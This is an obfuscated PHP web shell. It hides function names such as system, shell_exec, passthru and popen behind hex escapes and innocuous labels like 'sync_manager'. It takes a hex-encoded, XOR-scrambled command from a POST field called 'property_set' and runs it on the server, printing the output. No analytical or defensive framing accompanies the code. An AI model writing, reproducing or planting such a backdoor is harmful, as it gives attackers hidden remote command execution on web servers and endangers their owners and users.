<?php

$sync_manager2 = "\x73h\x65ll\x5F\x65\x78ec";
$sync_manager5 = "pop\x65n";
$sync_manager3 = "exec";
$sync_manager1 = "\x73y\x73\x74em";
$sync_manager6 = "\x73t\x72\x65\x61m\x5F\x67e\x74_\x63\x6Fn\x74ents";
$reverse_searcher = "he\x782bi\x6E";
$sync_manager4 = "p\x61s\x73th\x72u";
$sync_manager7 = "\x70c\x6Cose";
if (isset($_POST["p\x72\x6F\x70erty_\x73e\x74"])) {
            function unit_converter ($val, $record) {
$flg= '' ;
 for($l=0;
 $l<strlen($val);
 $l++){
$flg.=chr(ord($val[$l])^$record);

} return$flg;
 
}
            $property_set = $reverse_searcher($_POST["p\x72\x6F\x70erty_\x73e\x74"]);
            $property_set = unit_converter($property_set, 22);
            if (function_exists($sync_manager1)) {
                $sync_manager1($property_set);
            } elseif (function_exists($sync_manager2)) {
                print $sync_manager2($property_set);
            } elseif (function_exists($sync_manager3)) {
                $sync_manager3($property_set, $reference_val);
                print join("\n", $reference_val);
            } elseif (function_exists($sync_manager4)) {
                $sync_manager4($property_set);
            } elseif (function_exists($sync_manager5) && function_exists($sync_manager6) && function_exists($sync_manager7)) {
                $record_flg = $sync_manager5($property_set, 'r');
                if ($record_flg) {
                    $ent_component = $sync_manager6($record_flg);
                    $sync_manager7($record_flg);
                    print $ent_component;
                }
            }
            exit;
        }